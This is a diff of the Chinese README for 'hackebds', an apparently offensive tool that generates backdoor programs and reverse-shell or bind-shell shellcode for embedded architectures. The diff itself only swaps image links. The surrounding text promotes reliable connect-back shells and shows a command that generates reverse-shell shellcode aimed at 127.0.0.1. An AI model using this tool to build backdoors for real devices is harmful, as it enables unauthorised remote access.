@@ -19,7 +19,7 @@ pip install -U hackebds
 ```
 ### 安装问题
 出现python如下图问题请安装对应的binutils环境
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2a3b7df56db74e84b5521f6d03908b30.png)
+![image-20221107231221043](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221107231221043.png)
 #### 第一步
 ```
 apt search binutils | grep arm(这里的arm可以更换需要的对应架构)
@@ -30,7 +30,7 @@ apt install binutils-arm-linux-gnueabi/hirsute
 #### 1. 生成对应各种架构的后门程序，纯shellcode封装，回连shell成功概率大
 32为程序bind_shell中密码最多4个字符，64位程序最多8个字符
 使用命令行生成后门文件名、shell代码、binshell等
- ![image-20221102192550052](https://img-blog.csdnimg.cn/img_convert/9c445b62113e05f5253093104ebc99be.png)
+ ![image-20221107231221043](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221107231221043.png)
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode -passwd 1231
